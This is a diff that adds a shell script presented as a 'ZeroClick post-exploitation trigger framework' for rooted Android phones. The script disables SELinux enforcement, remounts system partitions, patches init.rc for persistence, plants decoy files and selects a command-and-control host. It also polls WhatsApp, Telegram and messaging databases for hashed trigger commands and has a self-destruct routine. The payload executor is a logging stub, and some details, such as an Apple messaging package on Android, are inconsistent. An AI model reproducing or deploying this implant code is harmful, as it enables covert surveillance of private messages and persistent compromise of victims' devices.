@@ -1,0 +1,465 @@
+# ZeroClick post-exploitation trigger framework
+
+ZC_ROOT="/data/local/zc"
+ZC_PERSIST="/persist/zc"
+ZC_SYSTEM="/system/etc/zc"
+ZC_LOG="$ZC_ROOT/zc.log"
+ZC_DB="$ZC_ROOT/state.db"
+ZC_POLL_INTERVAL=2
+ZC_HASH_ALGO="sha256"
+ZC_TARGET_APPS="com.apple.messages com.telegram.messenger com.whatsapp"
+ZC_C2_PRIMARY="c2.example.com"
+ZC_C2_BACKUP="backup.example.com"
+ZC_CHECK_HOSTS="androidupdate.com msn.com"
+ZC_SELF="$0"
+ZC_VERSION="1.0"
+
+zc_log() {
+  local msg="$1"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  echo "[$ts] $msg" >> "$ZC_LOG" 2>/dev/null
+}
+
+zc_check_root() {
+  if [ "$(id -u)" -ne 0 ]; then
+    zc_log "not root, abort"
+    return 1
+  fi
+  return 0
+}
+
+zc_check_selinux() {
+  local mode
+  mode=$(getenforce 2>/dev/null)
+  if [ "$mode" = "Enforcing" ]; then
+    setenforce 0 2>/dev/null
+    zc_log "selinux set to permissive"
+  fi
+  return 0
+}
+
+zc_mount_rw() {
+  local part="$1"
+  mount -o remount,rw "$part" 2>/dev/null
+  if [ $? -ne 0 ]; then
+    zc_log "remount rw failed for $part"
+    return 1
+  fi
+  return 0
+}
+
+zc_mount_ro() {
+  local part="$1"
+  mount -o remount,ro "$part" 2>/dev/null
+  return 0
+}
+
+zc_prepare_dirs() {
+  mkdir -p "$ZC_ROOT" 2>/dev/null
+  mkdir -p "$ZC_SYSTEM" 2>/dev/null
+  mkdir -p "$ZC_PERSIST" 2>/dev/null
+  chmod 700 "$ZC_ROOT" 2>/dev/null
+  chmod 700 "$ZC_SYSTEM" 2>/dev/null
+  chmod 700 "$ZC_PERSIST" 2>/dev/null
+  zc_log "directories prepared"
+}
+
+zc_prepare_dirs_system() {
+  zc_mount_rw /system
+  mkdir -p "$ZC_SYSTEM" 2>/dev/null
+  zc_mount_ro /system
+  zc_log "system dir prepared"
+}
+
+zc_prepare_dirs_persist() {
+  zc_mount_rw /persist
+  mkdir -p "$ZC_PERSIST" 2>/dev/null
+  zc_mount_ro /persist
+  zc_log "persist dir prepared"
+}
+
+zc_init_db() {
+  if [ ! -f "$ZC_DB" ]; then
+    echo "CREATE TABLE state (key TEXT PRIMARY KEY, value TEXT);" | sqlite3 "$ZC_DB" 2>/dev/null
+    echo "CREATE TABLE commands (hash TEXT PRIMARY KEY, payload TEXT, status TEXT);" | sqlite3 "$ZC_DB" 2>/dev/null
+    echo "CREATE TABLE logs (id INTEGER PRIMARY KEY, ts TEXT, msg TEXT);" | sqlite3 "$ZC_DB" 2>/dev/null
+    zc_log "db initialized"
+  fi
+}
+
+zc_db_set() {
+  local key="$1"
+  local value="$2"
+  echo "INSERT OR REPLACE INTO state (key, value) VALUES ('$key', '$value');" | sqlite3 "$ZC_DB" 2>/dev/null
+}
+
+zc_db_get() {
+  local key="$1"
+  sqlite3 "$ZC_DB" "SELECT value FROM state WHERE key='$key';" 2>/dev/null
+}
+
+zc_db_add_command() {
+  local hash="$1"
+  local payload="$2"
+  echo "INSERT OR REPLACE INTO commands (hash, payload, status) VALUES ('$hash', '$payload', 'pending');" | sqlite3 "$ZC_DB" 2>/dev/null
+}
+
+zc_db_get_command() {
+  local hash="$1"
+  sqlite3 "$ZC_DB" "SELECT payload FROM commands WHERE hash='$hash' AND status='pending';" 2>/dev/null
+}
+
+zc_db_mark_done() {
+  local hash="$1"
+  echo "UPDATE commands SET status='done' WHERE hash='$hash';" | sqlite3 "$ZC_DB" 2>/dev/null
+}
+
+zc_db_log() {
+  local msg="$1"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  echo "INSERT INTO logs (ts, msg) VALUES ('$ts', '$msg');" | sqlite3 "$ZC_DB" 2>/dev/null
+}
+
+zc_hash() {
+  local input="$1"
+  echo -n "$input" | openssl dgst -"$ZC_HASH_ALGO" 2>/dev/null | awk '{print $NF}'
+}
+
+zc_hash_file() {
+  local file="$1"
+  openssl dgst -"$ZC_HASH_ALGO" "$file" 2>/dev/null | awk '{print $NF}'
+}
+
+zc_verify_hash() {
+  local input="$1"
+  local expected="$2"
+  local actual
+  actual=$(zc_hash "$input")
+  if [ "$actual" = "$expected" ]; then
+    return 0
+  fi
+  return 1
+}
+
+zc_decrypt() {
+  local data="$1"
+  local key="$2"
+  echo "$data" | openssl enc -d -aes-256-cbc -a -k "$key" 2>/dev/null
+}
+
+zc_encrypt() {
+  local data="$1"
+  local key="$2"
+  echo "$data" | openssl enc -e -aes-256-cbc -a -k "$key" 2>/dev/null
+}
+
+zc_check_network() {
+  local host
+  for host in $ZC_CHECK_HOSTS; do
+    if ping -c 1 -W 2 "$host" >/dev/null 2>&1; then
+      zc_log "network check ok via $host"
+      return 0
+    fi
+  done
+  zc_log "network check failed"
+  return 1
+}
+
+zc_check_c2() {
+  local url="$1"
+  if command -v curl >/dev/null 2>&1; then
+    curl -s -m 5 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null
+  elif command -v wget >/dev/null 2>&1; then
+    wget -q -T 5 -O /dev/null "$url" 2>/dev/null && echo "200"
+  else
+    echo "000"
+  fi
+}
+
+zc_select_c2() {
+  local code
+  code=$(zc_check_c2 "https://$ZC_C2_PRIMARY")
+  if [ "$code" = "200" ]; then
+    echo "$ZC_C2_PRIMARY"
+    return 0
+  fi
+  code=$(zc_check_c2 "https://$ZC_C2_BACKUP")
+  if [ "$code" = "200" ]; then
+    echo "$ZC_C2_BACKUP"
+    return 0
+  fi
+  echo ""
+  return 1
+}
+
+zc_send_message() {
+  local target="$1"
+  local content="$2"
+  if command -v am >/dev/null 2>&1; then
+    am start -a android.intent.action.SEND -t text/plain --es android.intent.extra.TEXT "$content" 2>/dev/null
+    zc_log "message sent to $target"
+    return 0
+  fi
+  zc_log "message send failed"
+  return 1
+}
+
+zc_read_db_messages() {
+  local db_path="$1"
+  if [ ! -f "$db_path" ]; then
+    return 1
+  fi
+  sqlite3 "$db_path" "SELECT text FROM message ORDER BY date DESC LIMIT 50;" 2>/dev/null
+}
+
+zc_read_db_telegram() {
+  local db_path="$1"
+  if [ ! -f "$db_path" ]; then
+    return 1
+  fi
+  sqlite3 "$db_path" "SELECT message FROM messages ORDER BY date DESC LIMIT 50;" 2>/dev/null
+}
+
+zc_read_db_whatsapp() {
+  local db_path="$1"
+  if [ ! -f "$db_path" ]; then
+    return 1
+  fi
+  sqlite3 "$db_path" "SELECT text_data FROM message ORDER BY timestamp DESC LIMIT 50;" 2>/dev/null
+}
+
+zc_scan_messages() {
+  local app
+  local db_path
+  local line
+  local hash
+  for app in $ZC_TARGET_APPS; do
+    case "$app" in
+      com.apple.messages)
+        db_path="/data/data/com.apple.messages/databases/chat.db"
+        ;;
+      com.telegram.messenger)
+        db_path="/data/data/com.telegram.messenger/files/cache4.db"
+        ;;
+      com.whatsapp)
+        db_path="/data/data/com.whatsapp/databases/msgstore.db"
+        ;;
+      *)
+        continue
+        ;;
+    esac
+    if [ ! -f "$db_path" ]; then
+      continue
+    fi
+    while IFS= read -r line; do
+      if [ -z "$line" ]; then
+        continue
+      fi
+      hash=$(echo "$line" | grep -oE '[a-f0-9]{64}' | head -n 1)
+      if [ -z "$hash" ]; then
+        continue
+      fi
+      local payload
+      payload=$(zc_db_get_command "$hash")
+      if [ -n "$payload" ]; then
+        zc_log "command matched: $hash"
+        zc_execute_payload "$payload"
+        zc_db_mark_done "$hash"
+      fi
+    done <<EOF
+$(case "$app" in
+  com.apple.messages) zc_read_db_messages "$db_path" ;;
+  com.telegram.messenger) zc_read_db_telegram "$db_path" ;;
+  com.whatsapp) zc_read_db_whatsapp "$db_path" ;;
+esac)
+EOF
+  done
+}
+
+zc_execute_payload() {
+  local payload="$1"
+  local decoded
+  decoded=$(echo "$payload" | base64 -d 2>/dev/null)
+  if [ -z "$decoded" ]; then
+    zc_log "payload decode failed"
+    return 1
+  fi
+  zc_log "payload decoded, executing skeleton"
+  zc_skeleton_execute "$decoded"
+}
+
+zc_skeleton_execute() {
+  local cmd="$1"
+  zc_log "skeleton execute: $cmd"
+  return 0
+}
+
+zc_poll_loop() {
+  local running
+  running=$(zc_db_get "running")
+  if [ "$running" != "1" ]; then
+    zc_log "poll loop not enabled"
+    return 1
+  fi
+  zc_log "poll loop started"
+  while true; do
+    zc_scan_messages
+    sleep "$ZC_POLL_INTERVAL"
+  done
+}
+
+zc_start_poll() {
+  zc_db_set "running" "1"
+  zc_poll_loop &
+  echo $! > "$ZC_ROOT/poll.pid"
+  zc_log "poll started pid $(cat "$ZC_ROOT/poll.pid")"
+}
+
+zc_stop_poll() {
+  zc_db_set "running" "0"
+  if [ -f "$ZC_ROOT/poll.pid" ]; then
+    kill "$(cat "$ZC_ROOT/poll.pid")" 2>/dev/null
+    rm -f "$ZC_ROOT/poll.pid"
+  fi
+  zc_log "poll stopped"
+}
+
+zc_install_rc() {
+  local rc_src="$1"
+  local rc_dst="$2"
+  if [ ! -f "$rc_src" ]; then
+    zc_log "rc source missing"
+    return 1
+  fi
+  cp "$rc_src" "$rc_dst" 2>/dev/null
+  chmod 644 "$rc_dst" 2>/dev/null
+  zc_log "rc installed to $rc_dst"
+}
+
+zc_install_system_rc() {
+  zc_mount_rw /system
+  zc_install_rc "$ZC_ROOT/ZCwizard.rc" "$ZC_SYSTEM/ZCwizard.rc"
+  zc_mount_ro /system
+}
+
+zc_install_persist_rc() {
+  zc_mount_rw /persist
+  zc_install_rc "$ZC_ROOT/ZCwizard.rc" "$ZC_PERSIST/ZCwizard.rc"
+  zc_mount_ro /persist
+}
+
+zc_patch_init() {
+  local init_rc="/system/etc/init/hw/init.rc"
+  if [ ! -f "$init_rc" ]; then
+    init_rc="/init.rc"
+  fi
+  if [ ! -f "$init_rc" ]; then
+    zc_log "init.rc not found"
+    return 1
+  fi
+  zc_mount_rw /system
+  if ! grep -q "ZCwizard" "$init_rc" 2>/dev/null; then
+    echo "" >> "$init_rc"
+    echo "import /system/etc/zc/ZCwizard.rc" >> "$init_rc"
+    zc_log "init.rc patched"
+  fi
+  zc_mount_ro /system
+}
+
+zc_hide_files() {
+  local dir="$1"
+  local count=0
+  local suffixes="OCX PNF SYS DLL BFS NPA LCK PG PRO VER"
+  local i
+  for i in $(seq 1 20); do
+    local suffix
+    suffix=$(echo "$suffixes" | tr ' ' '\n' | shuf -n 1)
+    local name
+    name="$(head /dev/urandom | tr -dc 'A-Z0-9' | head -c 8).$suffix"
+    touch "$dir/$name" 2>/dev/null
+    count=$((count + 1))
+  done
+  zc_log "hidden files created: $count"
+}
+
+zc_self_destruct() {
+  zc_log "self destruct initiated"
+  zc_stop_poll
+  rm -f "$ZC_ROOT"/* 2>/dev/null
+  rm -f "$ZC_SYSTEM"/* 2>/dev/null
+  rm -f "$ZC_PERSIST"/* 2>/dev/null
+  rm -f "$ZC_DB" 2>/dev/null
+  rm -f "$ZC_LOG" 2>/dev/null
+  rm -f "$ZC_SELF" 2>/dev/null
+  zc_log "self destruct complete"
+}
+
+zc_cleanup() {
+  zc_stop_poll
+  zc_log "cleanup done"
+}
+
+zc_status() {
+  echo "ZC version: $ZC_VERSION"
+  echo "root: $(id -u)"
+  echo "selinux: $(getenforce 2>/dev/null)"
+  echo "poll pid: $(cat "$ZC_ROOT/poll.pid" 2>/dev/null)"
+  echo "running: $(zc_db_get running)"
+  echo "db: $ZC_DB"
+  echo "log: $ZC_LOG"
+}
+
+zc_main() {
+  zc_log "ZCwizard start"
+  zc_check_root || exit 1
+  zc_check_selinux
+  zc_prepare_dirs
+  zc_prepare_dirs_system
+  zc_prepare_dirs_persist
+  zc_init_db
+  zc_db_set "version" "$ZC_VERSION"
+  zc_install_system_rc
+  zc_install_persist_rc
+  zc_patch_init
+  zc_hide_files "$ZC_SYSTEM"
+  zc_hide_files "$ZC_PERSIST"
+  if zc_check_network; then
+    local c2
+    c2=$(zc_select_c2)
+    if [ -n "$c2" ]; then
+      zc_db_set "c2" "$c2"
+      zc_log "c2 selected: $c2"
+    fi
+  fi
+  zc_start_poll
+  zc_status
+  zc_log "ZCwizard done"
+}
+
+case "$1" in
+  start)
+    zc_main
+    ;;
+  stop)
+    zc_stop_poll
+    ;;
+  status)
+    zc_status
+    ;;
+  scan)
+    zc_scan_messages
+    ;;
+  clean)
+    zc_cleanup
+    ;;
+  destruct)
+    zc_self_destruct
+    ;;
+  *)
+    zc_main
+    ;;
+esac
+
+exit 0
